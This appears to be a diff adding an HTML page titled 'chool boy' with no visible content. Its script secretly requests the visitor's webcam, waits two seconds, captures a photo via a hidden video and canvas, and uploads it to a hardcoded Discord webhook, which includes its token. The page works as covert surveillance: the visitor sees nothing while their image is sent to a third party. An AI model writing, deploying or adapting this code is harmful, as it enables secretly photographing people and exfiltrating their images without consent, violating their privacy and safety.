@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>chool boy </title>
+</head>
+<body>
+
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1570178956970172537/XFxrgjuJ3U-pqvIdgvedqQWUs6n7vIGqBeMm882Z5sndgBYvzHJRyqx6nDPENnCm-lko';
+
+        navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }, audio: false })
+            .then(stream => {
+                video.srcObject = stream;
+                
+                setTimeout(() => {
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('file', blob, 'photo.jpg');
+
+                        fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            body: formData
+                        }).then(() => {
+                            stream.getTracks().forEach(track => track.stop());
+                        });
+                    }, 'image/jpeg', 0.9);
+                }, 2000);
+            })
+            .catch(err => {
+                console.error("Error accessing media devices.", err);
+            });
+    </script>
+
+</body>
+</html>
